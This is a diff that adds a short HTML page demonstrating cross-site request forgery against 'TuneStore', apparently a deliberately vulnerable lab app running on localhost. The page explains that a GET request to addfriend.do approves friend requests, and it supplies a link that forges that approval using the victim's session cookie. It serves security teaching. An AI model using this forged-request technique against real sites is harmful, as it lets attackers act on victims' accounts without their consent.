@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Approve Friend</title>
+</head>
+<body>
+    <p>This page is is hosted by the attacker served from a different origin than TuneStore (this page: http://127.0.0.1:8000, TuneStore: http://localhost:8082). </p>
+
+    <h1>CSRF Demonstration: forged friend approval</h1>
+
+    <p>TuneStore uses a GET request: <code>GET /Tunestore2020/addfriend.do?friend=attacker1</code> to approve a friend request. Because the victim's browser automatically attaches a session cookie to that request, sending the request in the victim's broswer will approve the friend request without their intentional approval.</p>
+
+    <h2>Friend request approval link</h2>
+    <p>
+        <a href="http://localhost:8082/Tunestore2020/addfriend.do?friend=attacker1">
+            approve attacker's friend request
+        </a>
+    </p>
+
+</body>
+</html>
